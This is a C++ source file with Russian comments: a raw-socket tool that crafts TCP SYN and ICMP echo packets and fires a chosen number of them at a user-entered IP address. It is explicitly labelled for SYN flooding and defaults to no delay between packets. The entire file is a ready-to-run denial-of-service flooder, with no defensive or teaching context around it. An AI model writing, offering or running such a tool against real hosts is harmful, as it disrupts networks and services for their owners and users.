#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <cerrno>
#include <exception>
#include <thread>
#include <chrono>
#include <csignal>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <stdexcept>

// Константы
const std::string LOG_FILE = "generator.log";
const int DEFAULT_PORT = 80; // Для SYN-флуда
const int BUFFER_SIZE = 1024;

// Глобальный флаг для обработки сигналов
volatile std::sig_atomic_t g_running = 1;

// Обработчик сигнала SIGINT
void signal_handler(int signal) {
    if (signal == SIGINT) {
        g_running = 0;
        std::cout << "\n[INFO] Получен SIGINT. Остановка...\n";
    }
}

// Вспомогательная функция для получения текущей временной метки
std::string get_timestamp() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::tm tm{};
    localtime_r(&time_t, &tm);
    
    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

// Вспомогательная функция для вычисления контрольной суммы (используется для ICMP и TCP)
uint16_t checksum(void* data, size_t length) {
    uint32_t sum = 0;
    uint16_t* ptr = static_cast<uint16_t*>(data);
    
    while (length > 1) {
        sum += *ptr++;
        length -= 2;
    }
    
    if (length > 0) {
        sum += *reinterpret_cast<uint8_t*>(ptr);
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return static_cast<uint16_t>(~sum);
}

// Проверка IPv4-адреса
bool validate_ip(const std::string& ip) {
    struct sockaddr_in sa{};
    return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
}

// Класс Logger для ведения журнала в файл и консоль
class Logger {
private:
    std::ofstream log_file;
    
public:
    Logger() {
        log_file.open(LOG_FILE, std::ios::app);
        if (!log_file.is_open()) {
            throw std::runtime_error("Не удалось открыть файл журнала: " + LOG_FILE);
        }
    }
    
    ~Logger() {
        if (log_file.is_open()) {
            log_file.close();
        }
    }
    
    void log(const std::string& message, bool to_console = true) {
        std::string timestamp = get_timestamp();
        std::string log_entry = "[" + timestamp + "] " + message;
        
        if (log_file.is_open()) {
            log_file << log_entry << std::endl;
            log_file.flush();
        }
        
        if (to_console) {
            std::cout << log_entry << std::endl;
        }
    }
    
    void log_error(const std::string& message) {
        log("[ERROR] " + message, true);
    }
    
    void log_info(const std::string& message) {
        log("[INFO] " + message, true);
    }
    
    void log_warning(const std::string& message) {
        log("[WARNING] " + message, true);
    }
};

// Класс PacketGenerator для создания и отправки пакетов
class PacketGenerator {
private:
    Logger& logger;
    int sockfd;
    struct sockaddr_in dest_addr;
    std::string target_ip;
    int packet_type; // 0 для SYN, 1 для ICMP
    int num_packets;
    int delay_ms;
    
public:
    PacketGenerator(Logger& logger, const std::string& ip, int type, int count, int delay)
        : logger(logger), target_ip(ip), packet_type(type), num_packets(count), delay_ms(delay), sockfd(-1) {
        // Инициализация адреса назначения
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_addr.s_addr = inet_addr(ip.c_str());
        
        // Создание raw-сокета
        sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sockfd < 0) {
            throw std::runtime_error("Не удалось создать raw-сокет: " + std::string(strerror(errno)));
        }
        
        // Установка IP_HDRINCL, чтобы указать, что мы предоставляем IP-заголовок
        int opt = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
            close(sockfd);
            throw std::runtime_error("Не удалось установить IP_HDRINCL: " + std::string(strerror(errno)));
        }
        
        // Установка порта назначения для SYN (ICMP не использует порт)
        if (packet_type == 0) { // SYN
            dest_addr.sin_port = htons(DEFAULT_PORT);
        }
    }
    
    ~PacketGenerator() {
        if (sockfd >= 0) {
            close(sockfd);
        }
    }
    
    // Формирование и отправка одного SYN-пакета
    void send_syn_packet(int seq_num) {
        // Буфер для пакета (IP-заголовок + TCP-заголовок)
        char buffer[sizeof(struct iphdr) + sizeof(struct tcphdr)];
        memset(buffer, 0, sizeof(buffer));
        
        // IP-заголовок
        struct iphdr* iph = reinterpret_cast<struct iphdr*>(buffer);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(getpid() & 0xFFFF); // Используем PID как ID
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0; // Установить в 0 перед вычислением
        iph->saddr = htonl(INADDR_ANY); // Адрес источника (будет назначен ядром)
        iph->daddr = dest_addr.sin_addr.s_addr;
        
        // Вычисление IP-контрольной суммы
        iph->check = checksum(iph, sizeof(struct iphdr));
        
        // TCP-заголовок
        struct tcphdr* tcph = reinterpret_cast<struct tcphdr*>(buffer + sizeof(struct iphdr));
        tcph->source = htons(12345); // Случайный порт источника
        tcph->dest = dest_addr.sin_port;
        tcph->seq = htonl(seq_num);
        tcph->ack_seq = 0;
        tcph->doff = 5; // Смещение данных: 5 * 4 = 20 байт
        tcph->syn = 1; // Флаг SYN
        tcph->window = htons(5840); // Размер окна
        tcph->check = 0; // Установить в 0 перед вычислением
        
        // Вычисление TCP-контрольной суммы (требуется псевдозаголовок)
        struct pseudo_header {
            uint32_t source_address;
            uint32_t dest_address;
            uint8_t placeholder;
            uint8_t protocol;
            uint16_t tcp_length;
        } psh;
        
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char* pseudogram = new char[psize];
        
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        
        tcph->check = checksum(pseudogram, psize);
        
        delete[] pseudogram;
        
        // Отправка пакета
        if (sendto(sockfd, buffer, iph->tot_len, 0, 
                   reinterpret_cast<struct sockaddr*>(&dest_addr), sizeof(dest_addr)) < 0) {
            throw std::runtime_error("Не удалось отправить SYN-пакет: " + std::string(strerror(errno)));
        }
    }
    
    // Формирование и отправка одного ICMP Echo Request пакета
    void send_icmp_packet(int seq_num) {
        // Буфер для пакета (IP-заголовок + ICMP-заголовок)
        char buffer[sizeof(struct iphdr) + sizeof(struct icmphdr)];
        memset(buffer, 0, sizeof(buffer));
        
        // IP-заголовок
        struct iphdr* iph = reinterpret_cast<struct iphdr*>(buffer);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr));
        iph->id = htons(getpid() & 0xFFFF);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_ICMP;
        iph->check = 0;
        iph->saddr = htonl(INADDR_ANY);
        iph->daddr = dest_addr.sin_addr.s_addr;
        
        // Вычисление IP-контрольной суммы
        iph->check = checksum(iph, sizeof(struct iphdr));
        
        // ICMP-заголовок
        struct icmphdr* icmph = reinterpret_cast<struct icmphdr*>(buffer + sizeof(struct iphdr));
        icmph->type = ICMP_ECHO;
        icmph->code = 0;
        icmph->checksum = 0;
        icmph->un.echo.id = htons(getpid() & 0xFFFF);
        icmph->un.echo.sequence = htons(seq_num);
        
        // Вычисление ICMP-контрольной суммы
        icmph->checksum = checksum(icmph, sizeof(struct icmphdr));
        
        // Отправка пакета
        if (sendto(sockfd, buffer, iph->tot_len, 0, 
                   reinterpret_cast<struct sockaddr*>(&dest_addr), sizeof(dest_addr)) < 0) {
            throw std::runtime_error("Не удалось отправить ICMP-пакет: " + std::string(strerror(errno)));
        }
    }
    
    // Основная функция для запуска генерации пакетов
    void run() {
        logger.log_info("Запуск генерации пакетов на " + target_ip + 
                        " (Тип: " + (packet_type == 0 ? "SYN" : "ICMP") + 
                        ", Пакетов: " + std::to_string(num_packets) + 
                        ", Задержка: " + std::to_string(delay_ms) + "мс)");
        
        int sent_count = 0;
        try {
            for (int i = 0; i < num_packets && g_running; ++i) {
                if (packet_type == 0) {
                    send_syn_packet(i);
                } else {
                    send_icmp_packet(i);
                }
                sent_count++;
                
                // Задержка между пакетами (если указана)
                if (delay_ms > 0 && i < num_packets - 1) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
                }
            }
            
            if (g_running) {
                logger.log_info("Успешно отправлено " + std::to_string(sent_count) + " пакетов.");
            } else {
                logger.log_info("Отправлено " + std::to_string(sent_count) + " пакетов до прерывания.");
            }
        } catch (const std::exception& e) {
            logger.log_error("Ошибка во время отправки пакетов: " + std::string(e.what()));
            throw; // Повторно выбрасываем, чтобы перехватить в main
        }
    }
};

// Функция для получения пользовательского ввода с проверкой
void get_user_input(std::string& ip, int& type, int& count, int& delay) {
    std::cout << "Введите целевой IP: ";
    std::getline(std::cin, ip);
    
    while (!validate_ip(ip)) {
        std::cout << "Неверный IP-адрес. Введите корректный IPv4-адрес: ";
        std::getline(std::cin, ip);
    }
    
    std::cout << "Выберите тип (SYN/ICMP): ";
    std::string type_str;
    std::getline(std::cin, type_str);
    
    while (type_str != "SYN" && type_str != "ICMP" && 
           type_str != "syn" && type_str != "icmp" &&
           type_str != "Syn" && type_str != "Icmp") {
        std::cout << "Неверный тип. Введите SYN или ICMP: ";
        std::getline(std::cin, type_str);
    }
    
    type = (type_str == "SYN" || type_str == "syn" || type_str == "Syn") ? 0 : 1;
    
    std::cout << "Количество пакетов: ";
    std::string count_str;
    std::getline(std::cin, count_str);
    
    try {
        count = std::stoi(count_str);
        while (count <= 0) {
            std::cout << "Количество пакетов должно быть положительным. Введите снова: ";
            std::getline(std::cin, count_str);
            count = std::stoi(count_str);
        }
    } catch (...) {
        std::cout << "Неверное число. Используется значение по умолчанию 1.\n";
        count = 1;
    }
    
    std::cout << "Задержка между блоками (мс): ";
    std::string delay_str;
    std::getline(std::cin, delay_str);
    
    try {
        delay = std::stoi(delay_str);
        while (delay < 0) {
            std::cout << "Задержка не может быть отрицательной. Введите снова: ";
            std::getline(std::cin, delay_str);
            delay = std::stoi(delay_str);
        }
    } catch (...) {
        std::cout << "Неверная задержка. Используется значение по умолчанию 0.\n";
        delay = 0;
    }
}

int main() {
    // Установка обработчика сигнала
    std::signal(SIGINT, signal_handler);
    
    try {
        // Проверка прав root
        if (getuid() != 0) {
            throw std::runtime_error("Для создания raw-сокетов требуются права root.");
        }
        
        // Получение пользовательского ввода
        std::string target_ip;
        int packet_type, num_packets, delay_ms;
        get_user_input(target_ip, packet_type, num_packets, delay_ms);
        
        // Инициализация логгера
        Logger logger;
        
        // Создание и запуск генератора пакетов
        PacketGenerator generator(logger, target_ip, packet_type, num_packets, delay_ms);
        generator.run();
        
    } catch (const std::runtime_error& e) {
        std::cerr << "[ERROR] " << e.what() << std::endl;
        // Попытка записать ошибку в журнал, если логгер доступен
        try {
            Logger logger;
            logger.log_error(e.what()); 
        } catch (...) {
            // Если логирование не удалось, просто выводим в консоль
        }
        return 1;
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Неожиданная ошибка: " << e.what() << std::endl;
        try {
            Logger logger;
            logger.log_error("Неожиданная ошибка: " + std::string(e.what()));
        } catch (...) {
            // Игнорируем ошибки логирования
        }
        return 1;
    } catch (...) {
        std::cerr << "[ERROR] Произошло неизвестное исключение." << std::endl;
        return 1;
    }
    
    return 0;
}